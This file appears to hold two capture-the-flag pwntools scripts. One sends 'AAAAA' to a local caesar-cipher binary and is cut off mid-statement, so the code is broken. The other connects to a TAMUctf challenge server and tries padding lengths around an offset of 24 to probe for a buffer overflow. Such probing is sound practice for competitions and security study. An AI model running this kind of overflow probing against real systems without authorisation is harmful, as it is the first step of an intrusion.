from pwn import *


def pwn_safety():
    # Start the process
    p = process('./safety_first')

    # Wait for the prompt
    p.recvuntil("""Welcome to my 🚀 BLAZING FAST 🚀 caesar cipher program.
    Enter your input: """)

    # Send the buffer
    p.sendline('AAAAA')

    # Print the response
    print(p.recvall()
      


from pwn import *
import time

for i in range(-2, 2, 1):
    p = remote("tamuctf.com", 443, ssl=True, sni="inspector-gadget")

    # Listen until the other side says "pwn me"
    offset = 24
    payload = b'A'*(offset+i)
    print(payload)
    p.sendlineafter(b'pwn me', payload)

    res = p.recvall().decode()
    print(res)
    if len(res) < 4:
        print('no res?', i, len(payload))

    time.sleep(1)

